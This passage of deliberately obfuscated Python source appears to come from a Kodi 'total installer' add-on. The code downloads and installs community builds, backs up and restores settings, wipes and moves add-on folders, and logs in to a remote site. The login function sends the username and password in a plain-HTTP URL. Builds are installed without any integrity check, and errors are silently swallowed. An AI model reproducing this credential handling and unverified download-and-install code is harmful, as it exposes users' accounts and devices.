   OOO = ii1I1 . replace ( III1 , oOOoOo0Ooo ) . replace ( ii1IIiiIi1111Ii1 , Oo0Ooo0 ) . replace ( O00oOOoOOOOO , o0OOoOoo00 )
   OooooOOoo0 = open ( ooOooo000oOO , mode = 'w+' )
   OooooOOoo0 . write ( str ( OOO ) )
   OooooOOoo0 . close ( )
   if 37 - 37: O00OOo00oo0o * OoooooooOO * OOOoOoo0O + Oo0Ooo . I1IiiI
  except :
   print "### NO GUISETTINGS DOWNLOADED"
   if 61 - 61: Oo . Oo
  if os . path . exists ( iIi1ii1I1 ) :
   os . remove ( iIi1ii1I1 )
   if 17 - 17: II111iiii / iiiiiiii1
  os . rename ( ooOooo000oOO , iIi1ii1I1 )
  try :
   os . remove ( o0 )
   if 80 - 80: Oo * OoO0O00 + O00OOo00oo0o
  except :
   pass
   if 62 - 62: OoooooooOO . O0 % Oo0Ooo
  os . makedirs ( Oo0oOOo )
  time . sleep ( 1 )
  OoooOOo0oOO ( )
  if 98 - 98: o0oOOo0O0Ooo * Oo0Ooo - O00OOo00oo0o . iiiiiiii1
  if 2 - 2: Oo0Ooo - iiiiiiii1 % iIii1I11I1II1
def II1i11i1iI1I ( ) :
 oOO0OOOOOo0Oo ( )
 o0O0o0O0O = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the guisettings zip file you want to restore' , 'files' , '.zip' , False , False , iiiiiIIii )
 if 27 - 27: IIiIi1iI
 if o0O0o0O0O == '' :
  return
  if 8 - 8: O0 * i1IIi - OoOoOO00 % I1IiiI / I1ii11iIi11i
 else :
  IIOoOooO = 1
  I1iO00O000oOO0oO ( o0O0o0O0O , IIOoOooO )
  if 76 - 76: Oo0Ooo * iiiiiiii1 % Oo . OoO0O00
  if 31 - 31: I1IiiI - OoooooooOO . IIiiiI1iIII
def I1IO00O0oO00o ( name , url , video ) :
 I1i1I1I11IiiI = xbmcgui . Dialog ( ) . yesno ( 'Full Wipe And New Install' , 'This is a great option for first time install or if you\'re encountering any issues with your device. This will wipe all your Kodi settings, do you wish to continue?' , nolabel = 'Cancel' , yeslabel = 'Accept' )
 if I1i1I1I11IiiI == 0 :
  return
  if 30 - 30: OoOoOO00 % IIiiiI1iIII . Oo0Ooo - OoooooooOO
 elif I1i1I1I11IiiI == 1 :
  if 8 - 8: Oo % IIiIi1iI . ooOo
  OOOoooOo00O = '/storage/openelec_temp/'
  iio0o0OoOo0 = '/storage/.restore/'
  IIo0o0O0O00oOOo = os . path . join ( iio0o0OoOo0 , iiiII ( ) + '.tar' )
  if not os . path . exists ( iio0o0OoOo0 ) :
   try :
    os . makedirs ( iio0o0OoOo0 )
   except :
    pass
  try :
   OOooO0OOoo . create ( 'Downloading Build' , 'Please wait' , '' , '' )
   downloader . download ( url , IIo0o0O0O00oOOo )
   O0i1I11I = True
  except :
   O0i1I11I = False
  time . sleep ( 2 )
  if 89 - 89: IIiiiI1iIII
  if O0i1I11I == True :
   if 87 - 87: o0oOOo0O0Ooo % Oo0Ooo % II111iiii + IIiIi1iI * I1IiiI
   try :
    I1I1IIiiii1ii = open ( I1IIiiIiii , mode = 'r' )
    ii1I1 = I1I1IIiiii1ii . read ( )
    I1I1IIiiii1ii . close ( )
    if 18 - 18: iiiiiiii1 * II111iiii
    I111I = re . compile ( 'id="(.+?)"' ) . findall ( ii1I1 )
    o0o = I111I [ 0 ] if ( len ( I111I ) > 0 ) else ''
    if 43 - 43: o0oOOo0O0Ooo / O0 + i1IIi - I1ii11iIi11i % i11iIiiIii
   except :
    pass
   if o0o != '' :
    Ooo0Oo0oo0 = 'http://noobsandnerds.com/TI/Community_Builds/downloadcount.php?id=%s' % ( o0o )
   try :
    ooo0O0o00O ( Ooo0Oo0oo0 , 5 )
   except :
    pass
    if 69 - 69: Oo % I1ii11iIi11i / OoOoOO00 . Oo - IIiiiI1iIII
    if 74 - 74: OoO0O00 - o0oOOo0O0Ooo - IIiiiI1iIII . O0 % iiiiiiii1
   if not os . path . exists ( OOOoooOo00O ) :
    try :
     os . makedirs ( OOOoooOo00O )
    except :
     pass
     if 32 - 32: OoOoOO00 . OoO0O00 / Oo0Ooo . i11iIiiIii
   iI111I11I1I1 . ok ( "Download Complete - Press OK To Reboot" , 'Once you press OK your device will attempt to reboot, if it hasn\'t rebooted within 30 seconds please pull the power to manually shutdown. When booting you may see lines of text, don\'t worry this is normal update behaviour!' )
   xbmc . executebuiltin ( 'Reboot' )
   if 9 - 9: OOOoOoo0O - II111iiii + IIi / ooOo % I1ii11iIi11i
   if 17 - 17: iIii1I11I1II1 - iiiiiiii1
def OO00O0Oo0oo0oo0 ( ) :
 OOooOoOooo = 0
 if iI111I11I1I1 . yesno ( 'Full Wipe And New Install' , 'This is a great option if you\'re encountering any issues with your device. This will wipe all your Kodi settings and restore with whatever is in the backup, do you wish to continue?' , nolabel = 'Cancel' , yeslabel = 'Accept' ) :
  ooooOoo00 = iI111I11I1I1 . browse ( 1 , 'Select the backup file you want to restore' , 'files' , '.tar' , False , False , O0Oo000ooO00 )
  if ooooOoo00 == '' :
   OOooOoOooo = 1
   if 2 - 2: OoO0O00 + IIi . ooOo - I1ii11iIi11i % IIiIi1iI
  if OOooOoOooo == 1 :
   xbmc . log ( "### No file selected, quitting restore process ###" )
   return
  IIo0o0O0O00oOOo = os . path . join ( oO0 , iiiII ( ) + '.tar' )
  if not os . path . exists ( oO0 ) :
   try :
    os . makedirs ( oO0 )
   except :
    pass
  OOooO0OOoo . create ( 'Copying File To Restore Folder' , '' , 'Please wait...' )
  shutil . copyfile ( ooooOoo00 , IIo0o0O0O00oOOo )
  xbmc . executebuiltin ( 'Reboot' )
  if 49 - 49: O0 . Oo0Ooo / O00OOo00oo0o
  if 29 - 29: I1ii11iIi11i / ooOo * O0 - i11iIiiIii - OoO0O00 + O00OOo00oo0o
def Oo0O ( ) :
 o0o00O0oOooO0 ( )
 if IioO0O ( ) :
  Ii1I1Ii ( '' , '[COLOR=dodgerblue]Restore a locally stored OpenELEC Backup[/COLOR]' , '' , 'restore_local_OE' , 'mainmenu/maintenance.png' , '' , '' , 'Restore A Full OE System Backup' )
  if 84 - 84: OoooooooOO . i11iIiiIii % OoO0O00 * Oo0Ooo / IIiIi1iI
 Ii1I1Ii ( '' , '[COLOR=dodgerblue]Restore A Locally stored build[/COLOR]' , 'local' , 'restore_local_CB' , 'mainmenu/maintenance.png' , '' , '' , 'Restore A Full System Backup' )
 Ii1I1Ii ( '' , '[COLOR=dodgerblue]Restore Local guisettings file[/COLOR]' , 'url' , 'LocalGUIDialog' , 'mainmenu/maintenance.png' , '' , '' , 'Back Up Your Full System' )
 if 95 - 95: OoO0O00 - i11iIiiIii . OoO0O00 % Oo * O0 + i11iIiiIii
 if os . path . exists ( os . path . join ( iiiiiIIii , 'addons.zip' ) ) :
  Ii1I1Ii ( '' , 'Restore Your Addons' , 'addons' , 'restore_zip' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your Addons' )
  if 65 - 65: O0 / IIiIi1iI . i1IIi * IIiIi1iI / iIii1I11I1II1 - ooOo
 if os . path . exists ( os . path . join ( iiiiiIIii , 'addon_data.zip' ) ) :
  Ii1I1Ii ( '' , 'Restore Your Addon UserData' , 'addon_data' , 'restore_zip' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your Addon UserData' )
  if 93 - 93: OoOoOO00 % i11iIiiIii - O00OOo00oo0o % OoO0O00
 if os . path . exists ( os . path . join ( iiiiiIIii , 'guisettings.xml' ) ) :
  Ii1I1Ii ( '' , 'Restore Guisettings.xml' , iIi1ii1I1 , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your guisettings.xml' )
  if 55 - 55: o0oOOo0O0Ooo . I1ii11iIi11i
 if os . path . exists ( os . path . join ( iiiiiIIii , 'favourites.xml' ) ) :
  Ii1I1Ii ( '' , 'Restore Favourites.xml' , ooooooO0oo , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your favourites.xml' )
  if 63 - 63: ooOo
 if os . path . exists ( os . path . join ( iiiiiIIii , 'sources.xml' ) ) :
  Ii1I1Ii ( '' , 'Restore Source.xml' , IIiiiiiiIi1I1 , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your sources.xml' )
  if 79 - 79: I1ii11iIi11i - ooOo - o0oOOo0O0Ooo . Oo
 if os . path . exists ( os . path . join ( iiiiiIIii , 'advancedsettings.xml' ) ) :
  Ii1I1Ii ( '' , 'Restore Advancedsettings.xml' , I1IIIii , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your advancedsettings.xml' )
  if 65 - 65: i11iIiiIii . OoO0O00 % IIiIi1iI + IIiiiI1iIII - i11iIiiIii
 if os . path . exists ( os . path . join ( iiiiiIIii , 'keyboard.xml' ) ) :
  Ii1I1Ii ( '' , 'Restore Advancedsettings.xml' , OOO00 , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your keyboard.xml' )
  if 60 - 60: IIi
 if os . path . exists ( os . path . join ( iiiiiIIii , 'RssFeeds.xml' ) ) :
  Ii1I1Ii ( '' , 'Restore RssFeeds.xml' , OOOO , 'restore_backup' , 'mainmenu/maintenance.png' , '' , '' , 'Restore Your RssFeeds.xml' )
  if 14 - 14: Oo0Ooo % ooOo * IIiIi1iI - i11iIiiIii / I1ii11iIi11i * i11iIiiIii
  if 95 - 95: iIii1I11I1II1 + OoOoOO00 . I1IiiI + OoOoOO00 * OOOoOoo0O + Oo
def i1i11IiII ( url ) :
 oOO0OOOOOo0Oo ( )
 if 'addons' in url :
  oo0O = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'addons.zip' ) )
  o00o0oo0OoO = II11iiii1Ii
  if 84 - 84: iIii1I11I1II1 % IIiIi1iI
 else :
  oo0O = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'addon_data.zip' ) )
  o00o0oo0OoO = iiI1IiI
  if 15 - 15: IIiIi1iI + i11iIiiIii % O0 % IIi + OoO0O00 * iiiiiiii1
 if 'Backup' in ooo0O :
  O0OooooO0o0O0 ( )
  OOooO0OOoo . create ( "Creating Backup" , "Backing Up" , '' , 'Please Wait' )
  oO0Oo0O0 = zipfile . ZipFile ( oo0O , 'w' , zipfile . ZIP_DEFLATED )
  I1iIiI1IiIIII = len ( o00o0oo0OoO )
  I1iiIi111I = [ ]
  Iiii1iIii = [ ]
  for Ii1iIi111I1i , I1III111i , iiI1iii in os . walk ( o00o0oo0OoO ) :
   for file in iiI1iii :
    Iiii1iIii . append ( file )
  Oo0O0Oo00O = len ( Iiii1iIii )
  for Ii1iIi111I1i , I1III111i , iiI1iii in os . walk ( o00o0oo0OoO ) :
   for file in iiI1iii :
    I1iiIi111I . append ( file )
    OOo00OO00Oo = len ( I1iiIi111I ) / float ( Oo0O0Oo00O ) * 100
    OOooO0OOoo . update ( int ( OOo00OO00Oo ) , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % file , 'Please Wait' )
    I1I1I11Ii = os . path . join ( Ii1iIi111I1i , file )
    if not 'temp' in I1III111i :
     if not I1IiI in I1III111i :
      import time
      Ii1ii11IIIi = '01/01/1980'
      OOoooOOOo0oO = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( I1I1I11Ii ) ) )
      if OOoooOOOo0oO > Ii1ii11IIIi :
       oO0Oo0O0 . write ( I1I1I11Ii , I1I1I11Ii [ I1iIiI1IiIIII : ] )
  oO0Oo0O0 . close ( )
  OOooO0OOoo . close ( )
  iI111I11I1I1 . ok ( "Backup Complete" , "You Are Now Backed Up" , '' , '' )
  if 46 - 46: IIiIi1iI . OoOoOO00
 else :
  OOooO0OOoo . create ( "Extracting Zip" , "Checking " , '' , 'Please Wait' )
  OOooO0OOoo . update ( 0 , "" , "Extracting Zip Please Wait" )
  extract . all ( oo0O , o00o0oo0OoO , OOooO0OOoo )
  time . sleep ( 1 )
  xbmc . executebuiltin ( 'UpdateLocalAddons ' )
  xbmc . executebuiltin ( "UpdateAddonRepos" )
  if 18 - 18: I1ii11iIi11i
  if 'Backup' in ooo0O :
   iI111I11I1I1 . ok ( "Install Complete" , 'Kodi will now close. Just re-open Kodi and wait for all the updates to complete.' )
   OoooOOo0oOO ( )
   if 33 - 33: i11iIiiIii % o0oOOo0O0Ooo . IIiIi1iI * Oo / OOOoOoo0O
  else :
   iI111I11I1I1 . ok ( "SUCCESS!" , "You Are Now Restored" , '' , '' )
   if 25 - 25: OoO0O00
   if 39 - 39: O00OOo00oo0o * OoOoOO00 + Oo0Ooo . Oo - O0 * I1ii11iIi11i
def O0o0ooo00o00 ( url ) :
 xbmc . executebuiltin ( 'RunAddon(%s)' % url )
 if 6 - 6: i11iIiiIii / OoO0O00 . i11iIiiIii / iiiiiiii1
 if 26 - 26: O0 * O00OOo00oo0o - I1IiiI - IIiIi1iI / iIii1I11I1II1
def O00oO00oOO00O ( title ) :
 oO0Ooo00O = ''
 Oo00o0OOo0OO = xbmc . Keyboard ( oO0Ooo00O , title )
 Oo00o0OOo0OO . doModal ( )
 if Oo00o0OOo0OO . isConfirmed ( ) :
  oO0Ooo00O = Oo00o0OOo0OO . getText ( ) . replace ( ' ' , '%20' )
  if oO0Ooo00O == None :
   return False
 return oO0Ooo00O
 if 74 - 74: o0oOOo0O0Ooo % OoOoOO00 . IIiIi1iI % IIi . O0 % II111iiii
 if 5 - 5: ooOo - OoooooooOO / OoOoOO00
def I1II1i1iIIi ( url ) :
 I1iII1IIi1IiI = iIioo0ooO ( heading = "Search for add-ons" )
 if 55 - 55: OoO0O00
 if ( not I1iII1IIi1IiI ) : return False , 0
 if 20 - 20: iiiiiiii1 * IIi * o0oOOo0O0Ooo - iiiiiiii1
 if 32 - 32: O00OOo00oo0o * ooOo
 o00OO0o0 = urllib . quote_plus ( I1iII1IIi1IiI )
 url += o00OO0o0
 OO ( url )
 if 85 - 85: i11iIiiIii . OoO0O00 + OoO0O00
 if 28 - 28: Oo0Ooo
def oOoo0O ( url ) :
 I1iII1IIi1IiI = iIioo0ooO ( heading = "Search for content" )
 if 55 - 55: iIii1I11I1II1 % OoOoOO00
 if 70 - 70: ooOo - O0 * iIii1I11I1II1 . IIi % O0
 if ( not I1iII1IIi1IiI ) : return False , 0
 if 99 - 99: I1IiiI
 if 30 - 30: O0 % OoooooooOO % OOOoOoo0O . i1IIi + IIi % Oo
 o00OO0o0 = urllib . quote_plus ( I1iII1IIi1IiI )
 url += o00OO0o0
 I11ii1i ( url )
 if 9 - 9: O0 . iIii1I11I1II1
def iI1iiI11iii ( url ) :
 i1I1i1 = 'http://noobsandnerds.com/TI/Community_Builds/community_builds.php?id=%s' % ( url )
 O0OoooO0 = ooo0O0o00O ( i1I1i1 , 5 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOooo0 = re . compile ( 'name="(.+?)"' ) . findall ( O0OoooO0 )
 iiI1ii1IIiI = re . compile ( 'author="(.+?)"' ) . findall ( O0OoooO0 )
 OO0o0oOOO0O = re . compile ( 'version="(.+?)"' ) . findall ( O0OoooO0 )
 ooo0O = oOooo0 [ 0 ] if ( len ( oOooo0 ) > 0 ) else ''
 IiIi1I1Iiii = iiI1ii1IIiI [ 0 ] if ( len ( iiI1ii1IIiI ) > 0 ) else ''
 oOOo0oo0O = OO0o0oOOO0O [ 0 ] if ( len ( OO0o0oOOO0O ) > 0 ) else ''
 iI111I11I1I1 . ok ( ooo0O , 'Author: [COLOR=dodgerblue]' + IiIi1I1Iiii + '[/COLOR]      Latest Version: [COLOR=dodgerblue]' + oOOo0oo0O + '[/COLOR]' , '' , 'Click OK to view the build page.' )
 try :
  o0O00O ( url + '&visibility=homepage' , url )
 except :
  return
  xbmc . log ( "### Could not find build No. %s" % url )
  iI111I11I1I1 . ok ( 'Build Not Found' , 'Sorry we couldn\'t find the build, it may be it\'s marked as private or servers may be busy. Please try manually searching via the Community Builds section' )
  if 72 - 72: iiiiiiii1 * Oo
  if 69 - 69: ooOo - i11iIiiIii
def I111II1 ( url ) :
 iI111I11I1I1 . ok ( "This build is not complete" , 'The guisettings.xml file was not copied over during the last install process. Click OK to go to the build page and complete Install Step 2 (guisettings fix).' )
 if 71 - 71: i11iIiiIii + O00OOo00oo0o / i11iIiiIii . Oo0Ooo
 try :
  o0O00O ( url + '&visibility=homepage' , url )
  if 96 - 96: O00OOo00oo0o * Oo . i11iIiiIii - I1IiiI
 except :
  return
  xbmc . log ( "### Could not find build No. %s" % url )
  iI111I11I1I1 . ok ( 'Build Not Found' , 'Sorry we couldn\'t find the build, it may be it\'s marked as private. Please try manually searching via the Community Builds section' )
  if 94 - 94: o0oOOo0O0Ooo + O00OOo00oo0o % o0oOOo0O0Ooo . IIi - iiiiiiii1 * I1IiiI
  if 62 - 62: Oo0Ooo * i1IIi % I1ii11iIi11i + Oo0Ooo . O0 . iiiiiiii1
def OOO00oO0O ( ) :
 i1I1i1 = 'http://noobsandnerds.com/TI/login/login_details.php?user=%s&pass=%s' % ( Oo0oO0ooo , o0oOoO00o )
 O0OoooO0 = ooo0O0o00O ( i1I1i1 , 5 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 IIi1 = re . compile ( 'login_msg="(.+?)"' ) . findall ( O0OoooO0 )
 ooo00o0o = IIi1 [ 0 ] if ( len ( IIi1 ) > 0 ) else ''
 OOoO0OooO = re . compile ( 'posts="(.+?)"' ) . findall ( O0OoooO0 )
 IiiOo = re . compile ( 'messages="(.+?)"' ) . findall ( O0OoooO0 )
 iiiIiii11i1i = re . compile ( 'unread="(.+?)"' ) . findall ( O0OoooO0 )
 ooo0O0Oo0O = re . compile ( 'email="(.+?)"' ) . findall ( O0OoooO0 )
 Oo0oi1i = IiiOo [ 0 ] if ( len ( IiiOo ) > 0 ) else ''
 OO00O0O00oOOO = iiiIiii11i1i [ 0 ] if ( len ( iiiIiii11i1i ) > 0 ) else ''
 ii1111iIIiIIi = ooo0O0Oo0O [ 0 ] if ( len ( ooo0O0Oo0O ) > 0 ) else ''
 ooOo0Oo = OOoO0OooO [ 0 ] if ( len ( OOoO0OooO ) > 0 ) else ''
 if 44 - 44: O00OOo00oo0o . OoooooooOO % IIi + o0oOOo0O0Ooo % OOOoOoo0O * Oo
 i1I1i1 = 'http://noobsandnerds.com/TI/menu_check'
 try :
  O0OoooO0 = ooo0O0o00O ( i1I1i1 , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  Ooo000O00 = re . compile ( 'd="(.+?)"' ) . findall ( O0OoooO0 )
  i1iI1Iiii1I = Ooo000O00 [ 0 ] if ( len ( Ooo000O00 ) > 0 ) else 'none'
 except :
  i1iI1Iiii1I = 'none'
  if 57 - 57: o0oOOo0O0Ooo % Oo0Ooo / I1ii11iIi11i
 if 'Welcome Back' in ooo00o0o :
  print "### ATTEMPTING TO WRITE COOKIE "
  OooooOOoo0 = open ( IIIii1II1II , mode = 'w+' )
  OooooOOoo0 . write ( 'd="' + binascii . hexlify ( iiiII ( ) ) + '"\nl="' + binascii . hexlify ( ooo00o0o ) + '"\np="' + binascii . hexlify ( ooOo0Oo ) + '"\nm="' + binascii . hexlify ( i1iI1Iiii1I ) + '"' )
  OooooOOoo0 . close ( )
 if not "Account currently restricted" in ooo00o0o :
  iI111I11I1I1 . ok ( 'Account Details' , 'Username:  ' + Oo0oO0ooo , 'Email: ' + ii1111iIIiIIi , 'Unread Messages: ' + OO00O0O00oOOO + '/' + Oo0oi1i + '[CR]Posts: ' + ooOo0Oo )
 else :
  iI111I11I1I1 . ok ( 'Account Currently Restricted' , 'Your account has a restriction in place, this is usually for account sharing. Any users caught sharing accounts are automatically put on a suspension and continual abuse will result in a permanent ban.' )
  if 9 - 9: OOOoOoo0O / OoOoOO00 % O0 % I1ii11iIi11i
  if 5 - 5: iiiiiiii1
def oOOOOOoOOoo0 ( url , type ) :
 I1iii = Oo00OOOOO
 if type == 'communitybuilds' :
  I1iii = 'mainmenu/builds.png'
  i1IiII1I = 'grab_builds'
  if url . endswith ( "visibility=public" ) :
   Ii1I1Ii ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&visibility=public' , 'manual_search' , I1iii , '' , '' , '' )
  if url . endswith ( "visibility=private" ) :
   Ii1I1Ii ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , '&visibility=private' , 'manual_search' , I1iii , '' , '' , '' )
 if type == 'addons' :
  I1iii = 'mainmenu/addons.png'
  i1IiII1I = 'grab_addons'
  Ii1I1Ii ( 'folder' , '[COLOR=dodgerblue]Sort by Most Popular[/COLOR]' , str ( url ) + '&sortx=downloads&orderx=DESC' , i1IiII1I , I1iii , '' , '' , '' )
 if type != 'addons' :
  Ii1I1Ii ( 'folder' , '[COLOR=dodgerblue]Sort by Most Popular[/COLOR]' , str ( url ) + '&sortx=downloadcount&orderx=DESC' , i1IiII1I , I1iii , '' , '' , '' )
 else :
  Ii1I1Ii ( 'folder' , '[COLOR=dodgerblue]Sort by Newest[/COLOR]' , str ( url ) + '&sortx=created&orderx=DESC' , i1IiII1I , I1iii , '' , '' , '' )
  Ii1I1Ii ( 'folder' , '[COLOR=dodgerblue]Sort by Recently Updated[/COLOR]' , str ( url ) + '&sortx=updated&orderx=DESC' , i1IiII1I , I1iii , '' , '' , '' )
 Ii1I1Ii ( 'folder' , '[COLOR=dodgerblue]Sort by A-Z[/COLOR]' , str ( url ) + '&sortx=name&orderx=ASC' , i1IiII1I , I1iii , '' , '' , '' )
 if type == 'public_CB' :
  Ii1I1Ii ( 'folder' , '[COLOR=dodgerblue]Sort by Genre[/COLOR]' , url , 'genres' , I1iii , '' , '' , '' )
  if 59 - 59: II111iiii % I1IiiI * O0 . OoooooooOO - OoooooooOO % O0
  if 56 - 56: ooOo - i1IIi * OoooooooOO - II111iiii
def iii1I ( ) :
 oOo00Ooo0o0 ( 'Speed Test Instructions' , '[COLOR=blue][B]What file should I use: [/B][/COLOR][CR]This function will download a file and will work out your speed based on how long it took to download. You will then be notified of '
 'what quality streams you can expect to stream without buffering. You can choose to download a 10MB, 16MB, 32MB, 64MB or 128MB file to use with the test. Using the larger files will give you a better '
 'indication of how reliable your speeds are but obviously if you have a limited amount of bandwidth allowance you may want to opt for a smaller file.'
 '[CR][CR][COLOR=blue][B]How accurate is this speed test:[/B][/COLOR][CR]Not very accurate at all! As this test is based on downloading a file from a server it\'s reliant on the server not having a go-slow day '
 'but the servers used should be pretty reliable. The 10MB file is hosted on a different server to the others so if you\'re not getting the results expected please try another file. If you have a fast fiber '
 'connection the chances are your speed will show as considerably slower than your real download speed due to the server not being able to send the file as fast as your download speed allows. Essentially the '
 'test results will be limited by the speed of the server but you will at least be able to see if it\'s your connection that\'s causing buffering or if it\'s the host you\'re trying to stream from'
 '[CR][CR][COLOR=blue][B]What is the differnce between Live Streams and Online Video:[/COLOR][/B][CR]When you run the test you\'ll see results based on your speeds and these let you know the quality you should expect to '
 'be able stream with your connection. Live Streams as the title suggests are like traditional TV channels, they are being streamed live so for example if you wanted to watch CNN this would fall into this category. '
 'Online Videos relates to movies, tv shows, youtube clips etc. Basically anything that isn\'t live - if you\'re new to the world of streaming then think of it as On Demand content, this is content that\'s been recorded and stored on the web.'
 '[CR][CR][COLOR=blue][B]Why am I still getting buffering:[/COLOR][/B][CR]The results you get from this test are strictly based on your download speed, there are many other factors that can cause buffering and contrary to popular belief '
 'having a massively fast internet connection will not make any difference to your buffering issues if the server you\'re trying to get the content from is unable to send it fast enough. This can often happen and is usually '
 'down to heavy traffic (too many users accessing the same server). A 10 Mb/s connection should be plenty fast enough for almost all content as it\'s very rare a server can send it any quicker than that.'
 '[CR][CR][COLOR=blue][B]What\'s the difference between MB/s and Mb/s:[/COLOR][/B][CR]A lot of people think the speed they see advertised by their ISP is Megabytes (MB/S) per second - this is not true. Speeds are usually shown as Mb/s '
 'which is Megabit per second - there are 8 of these to a megabyte so if you want to work out how many megabytes per second you\'re getting you need to divide the speed by 8. It may sound sneaky but really it\'s just the unit that has always been used.'
 '[CR][CR]A direct link to the buffering thread explaining what you can do to improve your viewing experience can be found at [COLOR=yellow]http://bit.ly/bufferingfix[/COLOR]'
 '[CR][CR]Thank you, [COLOR=dodgerblue]noobsandnerds[/COLOR] Team.' )
 if 11 - 11: Oo0Ooo * OoooooooOO - i11iIiiIii
 if 13 - 13: i11iIiiIii . O0 / Oo * i1IIi
def I1i1i1i ( ) :
 Ii1I1Ii ( '' , '[COLOR=blue]Instructions - Read me first[/COLOR]' , 'none' , 'speed_instructions' , '' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Download 5MB file' , 'http://download.thinkbroadband.com/5MB.zip' , 'runtest' , '' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Download 10MB file' , 'http://download.thinkbroadband.com/10MB.zip' , 'runtest' , '' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Download 20MB file' , 'http://download.thinkbroadband.com/20MB.zip' , 'runtest' , '' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Download 50MB file' , 'http://download.thinkbroadband.com/50MB.zip' , 'runtest' , '' , '' , '' , '' )
 Ii1I1Ii ( '' , 'Download 100MB file' , 'http://download.thinkbroadband.com/100MB.zip' , 'runtest' , '' , '' , '' , '' )
 if 78 - 78: O0
def Oo000O ( name ) :
 if 34 - 34: II111iiii
 OOooO0OOoo . create ( 'Creating Profile' , '' , '' , '' )
 O00O0O0OO00oo = oo0o ( name )
 if 20 - 20: I1IiiI % i1IIi % OoOoOO00 % IIi + O0
 if 54 - 54: O0
 II111IiiiI1 = [ ]
 for i1II1 in os . listdir ( OO0o ) :
  II111IiiiI1 . append ( i1II1 )
  if 3 - 3: I1ii11iIi11i
  if 42 - 42: OOOoOoo0O % Oo0Ooo + IIiiiI1iIII - OOOoOoo0O . iIii1I11I1II1 - O00OOo00oo0o
  I1iIiI1iiI = open ( os . path . join ( II , name , 'addonlist' ) , mode = 'r' )
  oO000O00 = I1iIiI1iiI . read ( )
  I1iIiI1iiI . close ( )
  oO000O00 = oO000O00 . split ( '|' )
  if 39 - 39: O0 * Oo0Ooo - I1IiiI + O00OOo00oo0o / II111iiii
  if 66 - 66: iiiiiiii1 + ooOo % OoooooooOO
 O0OO ( 'profiles' )
 for i1II1 in os . listdir ( II11iiii1Ii ) :
  if not i1II1 in II111IiiiI1 and i1II1 != 'plugin.program.totalinstaller' and i1II1 != 'repository.noobsandnerds' and i1II1 != 'packages' :
   try :
    shutil . copytree ( os . path . join ( O0o0O00Oo0o0 , 'addons' , i1II1 ) , os . path . join ( II , 'Master' , 'backups' , i1II1 ) )
    if oOOoo00O0O == 'true' :
     xbmc . log ( "### Successfully copied %s to %s" % ( i1II1 , os . path . join ( II , 'Master' , 'backups' , i1II1 ) ) )
   except :
    xbmc . log ( "### Failed to copy %s to backup folder, must already exist" % i1II1 )
   if not i1II1 in oO000O00 and i1II1 != o00OO00OoO :
    try :
     os . rename ( os . path . join ( II11iiii1Ii , i1II1 ) , os . path . join ( II , 'Master' , i1II1 ) )
    except :
     try :
      shutil . copytree ( os . path . join ( II11iiii1Ii , i1II1 ) , os . path . join ( II , 'Master' , i1II1 ) )
     except :
      try :
       shutil . rmtree ( os . path . join ( II11iiii1Ii , i1II1 ) )
      except :
       xbmc . log ( "### Unable to move %s as it's currently in use" % i1II1 )
 shutil . rmtree ( O0o0O00Oo0o0 )
 if 23 - 23: ooOo . OoOoOO00 + iIii1I11I1II1
 if 17 - 17: IIiiiI1iIII
 for i1II1 in oO000O00 :
  if not i1II1 in II111IiiiI1 and not i1II1 in II11iiii1Ii :
   try :
    os . rename ( os . path . join ( II , 'Master' , i1II1 ) , os . path . join ( II11iiii1Ii , i1II1 ) )
   except :
    pass
    if 12 - 12: i1IIi . OoO0O00
 II1ii1 ( )
 OOO00O00ooo0o ( )
 OoOoo ( i1i )
 xbmc . log ( "### WIPE FUNCTIONS COMPLETE" )
 if 97 - 97: iiiiiiii1 * Oo0Ooo / o0oOOo0O0Ooo . II111iiii / IIiIi1iI / IIiIi1iI
 if 25 - 25: IIiIi1iI
 try :
  I1I1IIiiii1ii = open ( O000oo0O , mode = 'r' )
  ii1I1 = I1I1IIiiii1ii . read ( )
  I1I1IIiiii1ii . close ( )
  xbmc . log ( "### original idfile contents: %s" % ii1I1 )
 except :
  xbmc . log ( "### original id file does not exist" )
  if 85 - 85: Oo0Ooo + Oo0Ooo % OOOoOoo0O + IIi
 try :
  extract . all ( os . path . join ( II , name , 'build.zip' ) , iIii1 , OOooO0OOoo )
  O0i1I11I = 1
  xbmc . log ( "### Extraction of build successful" )
 except :
  iI111I11I1I1 . ok ( 'Error' , "Sorry it wasn't possible to extract your build, there is a problem with your build zip file." )
  O0i1I11I = 0
  if 57 - 57: OoOoOO00 / I1ii11iIi11i
  if 90 - 90: O00OOo00oo0o / ooOo * Oo0Ooo * Oo0Ooo / OoOoOO00
 if not os . path . exists ( Ii1iIiII1ii1 ) :
  os . makedirs ( Ii1iIiII1ii1 )
 if os . path . exists ( os . path . join ( iiI1IiI , 'plugin.program.totalinstaller' , 'id.xml' ) ) and os . path . exists ( os . path . join ( iiI1IiI , 'ti_id' , 'id.xml' ) ) :
  os . remove ( O000oo0O )
  xbmc . log ( '### REMOVED STANDARD id.xml' )
 if os . path . exists ( os . path . join ( iiI1IiI , 'ti_id' , 'id.xml' ) ) :
  os . rename ( os . path . join ( iiI1IiI , 'ti_id' , 'id.xml' ) , O000oo0O )
 else :
  xbmc . log ( '### id file does not exist' )
  if 86 - 86: I1ii11iIi11i * iiiiiiii1 - O0
  if 21 - 21: I1IiiI . Oo0Ooo
 if os . path . exists ( I11iii1Ii ) and os . path . exists ( os . path . join ( iiI1IiI , 'ti_id' , 'startup.xml' ) ) :
